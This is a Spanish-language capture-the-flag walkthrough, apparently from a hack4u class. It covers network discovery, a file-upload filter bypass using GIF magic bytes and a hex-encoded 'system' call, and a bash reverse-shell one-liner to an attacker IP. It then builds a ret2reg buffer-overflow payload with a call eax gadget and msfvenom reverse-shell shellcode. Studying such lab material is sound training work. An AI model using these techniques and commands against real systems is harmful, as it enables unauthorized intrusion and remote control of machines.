Descubrimiento de la ip en nuestra red local

En esta máquina comenzamos comprobando si tenemos conexión con ella en nuestra localhost con el siguiente comando:

arp-scan -I ens33 -localnet -ignoredups

Con esto conseguimos ver la ip de la máquina que vamos a vulnerar.

En este caso la dirección ip de la máquina la podemos distinguir del resto por la descripción de la dirección MAC, VMware, Inc.

Una vez identificamos la máquina, procedemos a lanzarle un ping para ver si tenemos conexión con ella. Como podemos observar , esta máquina no devuelve la traza ICMP, por lo que debe de tener algún tipo de firewall.

Abuso de subida de archivos

Probando el típico archivo php malicioso para poder controlar que comando insertamos resulta que el formato no nos lo permite, por lo que haciendo uso de los magic numbers, escribimos GIF8; dentro del archivo y cambiamos la extensión a .gif.

De esta manera si se nos permite realizar subida de archivos pero nos salta un firewall, el cual detecta que estamos subiendo código php malicioso. Para pasar este firewall podemos escribir system en hexadecimal.

De esta manera conseguimos subir el archivo y tener ejecución remota de comandos. Nos entablamos una reverse shell con el típico one liner:

bash -c "bash -i >%26 /dev/tcp/192.168.1.150/443 0>%261"

Lo de %26 es el & pero url encodeado para evitar problemas.

Tras esto y ponernos en escucha por el puerto 443 con netcat, nc -nlvp 443 , ya tenemos la reverse shell. Ahora realizamos el tratamiento de la shell.

Tras esto ya tenemos una terminal completamente tratada y lista.

Checkeando que tipo de seguridad está activa en el binario, podemos ver lo siguiente:

Nada que nos interese de momento. Checkeando si tenemos aleatorización de la memoria con el siguiente comando: cat /proc/sys/kernel/randomize_va_space podemos ver lo siguiente:

Por lo que la aleatorización de la memoria está activa. En este caso, y como caso en la clase de hack4u, vamos a utilizar la técnica: rec2reg

Sin tener que llegar a explotar el rec2libc , esta es una variante aprovechándonos de una llamada a call eax.

Para sacar la llamada call eax ejecutaremos el siguiente comando: objdump -d {binario} | grep -i "ff d0"

Para saber cual es la dirección call eax utilizaremos la siguiente utilidad: /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

Y obtendremos la dirección a la llamada call eax para que lea nuestra shellcode.

El problema es que este shellcode ocupa menos bytes de lo que se necesita para rellenar el offset, por lo que necesitaremos rellenar el espacio necesario restante entre el offset y el eip para poder apuntar a esta dirección estática cal eax.

Lo haremos con la siguiente línea de código en nuestro script:

payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", {dirección estática})

Lo segundo que haremos es crear nuestro shellcode para entablarnos una reverse shell con el siguiente comando: msfvenom -p linux/x86/shell_reverse_tcp LHOST=[MI IP] LPORT=443 -b '\x00\x0a\x0d' -f c

Después de esto añadiremos todo a un script y crearemos las conexiones con el localhost y el puerto correspondiente.
